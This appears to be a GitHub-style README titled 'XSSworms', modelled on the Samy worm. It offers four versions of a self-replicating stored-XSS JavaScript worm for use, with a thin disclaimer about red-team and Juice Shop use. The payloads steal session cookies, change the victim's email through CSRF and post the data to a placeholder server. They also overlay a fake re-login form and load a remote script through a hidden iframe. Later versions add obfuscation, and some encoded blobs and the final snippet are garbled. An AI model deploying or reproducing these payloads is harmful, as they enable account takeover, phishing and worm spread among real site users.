# XSSworms
Based on samy

## Warning
These are dangerous use only in red team DV cleared operations ensuring all data ex-filtration is secured and encrypted.
Or use in places like owasp juice shop for educational purposes only.

### Fill in the placeholders yourself or I would go to jail for this.

Functional
```javascript
(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Inject itself for persistence
    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = '(' + arguments.callee.toString() + ')();';
    document.body.appendChild(script);

    // Define self-replicating payload
    var payload = `<script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
    </script>`;

    // Simulate persistent XSS injection into a stored area
    var targetElement = document.getElementById("user-profile") || document.getElementById("comment-section");
    if (targetElement) {
        targetElement.innerHTML += payload;
    }

    // 🔗 CSRF Attack Simulation: Change User Email
    fetch('/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=attacker@redteam.com'
    });

    // 🔗 Session Hijacking (Demo - Ethical logging)
    var sessionData = document.cookie;
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS Session Test',
            session: sessionData,
            affectedPage: window.location.href
        })
    });

    // 🔗 Fake Login Phishing Simulation
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;

    document.body.innerHTML += fakeLogin;

    // Ethical Logging
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS PoC Executed',
            timestamp: new Date().toISOString(),
            affectedPage: window.location.href
        })
    });

    // Proof-of-concept alert
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');

})();
```
Auto deploy

```javascript
(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Obfuscate script injection with base64 encoding
    var obfuscatedPayload = 'KGZ1bmN0aW9uKCkgewogICAgaWYgKGRvY3VtZW50LmdldElkKCdxc3Mtd29ybScpKSBpZnJlY2xpZnQgcmV0dXJuOwogICAgdmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgc2NyaXB0LmlkID0gJ3hzc3Mtd29ybSc7CiAgICBzY3JpcHQuaW5uZXJIVE1MID0gJygmYXJncy5jYWxsZUVsZW1lbnQudG9TdHJpbmcoKTsgZG9jdW1lbnQuYm9keUFwcGVuZENoaWxkKCczYmNsYScsIHNjcmlwdCk7Cn0pKCk7';

    var decodedPayload = atob(obfuscatedPayload); // Decode the obfuscated payload

    // Inject the decoded payload
    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = decodedPayload;
    document.body.appendChild(script);

    // Payload Replication Mechanism
    var replicationPayload = `
        <script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
        </script>`;

    // Auto-inject payload into various areas like profile, comments, and more
    var elementsToInject = [
        document.getElementById("user-profile"),
        document.getElementById("comment-section"),
        document.querySelectorAll('input[type="text"], textarea')
    ];

    elementsToInject.forEach(function(target) {
        if (target) {
            target.innerHTML += replicationPayload;
        }
    });

    // 🔗 CSRF Attack Simulation: Change User Email
    fetch('/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=attacker@redteam.com'
    });

    // 🔗 Session Hijacking (Demo - Ethical logging)
    var sessionData = document.cookie;
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS Session Test',
            session: sessionData,
            affectedPage: window.location.href
        })
    });

    // 🔗 Fake Login Phishing Simulation
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;
    document.body.innerHTML += fakeLogin;

    // Ethical Logging
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS PoC Executed',
            timestamp: new Date().toISOString(),
            affectedPage: window.location.href
        })
    });

    // Proof-of-concept alert
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');
})();
```
Obfuscation
```javascript
(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Obfuscate script creation using dynamic function and variable names
    var obfuscatedFunc = atob('ZnVuY3Rpb24oKXsgdmFyIHNoZ3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQtYnJvdycpOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZovuowOnew4)');
    var decodedFunc = atob(obfuscatedFunc);

    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = decodedFunc;
    document.body.appendChild(script);

    // Dynamic Payload Replication
    var replicationPayload = `
        <script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
        </script>`;

    // ** Dynamic Injection Based on Vulnerable Elements **
    var elementsToInject = [
        document.getElementById("user-profile"),
        document.getElementById("comment-section"),
        document.querySelectorAll('input[type="text"], textarea')
    ];

    elementsToInject.forEach(function(target) {
        if (target) {
            // Further filter based on vulnerability conditions (e.g., missing sanitization)
            if (target.innerHTML.includes('<script>')) {
                target.innerHTML += replicationPayload;  // Inject the payload in detected vulnerable areas
            }
        }
    });

    // Bypass any CSP headers with customized script injections if applicable
    var injectViaIframe = `
        <iframe style="display:none;" src="javascript:document.body.appendChild(document.createElement('script')).src='https://example.com/evil-payload.js';"></iframe>
    `;
    document.body.innerHTML += injectViaIframe;

    // Ethical Monitoring & Reporting (automated log generation)
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'Enhanced XSS PoC Executed',
            timestamp: new Date().toISOString(),
            detectedVulnerability: 'Missing Input Sanitization',
            affectedPage: window.location.href
        })
    });

    // Simulate a CSRF attack by dynamically submitting forms
    var csrfPayload = `
        <form method="POST" action="/change-email" style="display:none;">
            <input type="text" name="email" value="attacker@redteam.com">
        </form>
        <script>document.forms[0].submit();</script>
    `;
    document.body.innerHTML += csrfPayload;

    // Inject the fake login page again (if not detected earlier)
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;
    document.body.innerHTML += fakeLogin;

    // Proof-of-concept message (for controlled environment)
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');
})();
```
Fully Obfuscated with dynamic deployment

```javascript
(function(){if(document.getElementById('xss-worm'))return;var _0x7fbb=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x64","\x61\x74\x6F\x62","\x62\x6F\x64\x79","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x63\x72\x65\x61\x74\x65\x44\x6F\x63\x75\x6D\x65\x6E\x74"];var _0x3177=["\x72\x65\x70\x6C\x61\x63\x65","\x65\x6C\x65\x6D\x65\x6E\x74"];var _0x4093=["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"];var _0x3f6c=["\x68\x74\x74\x70\x3A\x2F\x2F\x79\x6F\x75\x72\x2D\x72\x65\x64\x74\x65\x61\x6D\x2D\x73\x65\x72\x76\x65\x72\x2E\x6C\x6F\x67"];var _0x229d="XSS Payload Executed";var _0x7b55=eval(atob("ZnVuY3Rpb24oKXsgdmFyIHNoZ3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQtYnJvdycpOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZovuowOnew4);eval(_0x7b55);document.body.appendChild(script);document.body.innerHTML+=`\x3Cscript\x20id=\x22xss-worm\x22\x3E\x28function\x28%29%7Bif%28document.getElementById%28%27xss-worm%27%29%29return%3Bvar%20script%20%3D%20document.createElement%28%27script%27%29%3Bscript.id%20%3D%27xss-worm%27%3Bscript.innerHTML%20%3D%28%27%27+arguments.callee.toString%28%29%29%3Bdocument.body.appendChild%28script%29%3B%7D%29%28%29%3C/script%3E`;})();}();
```

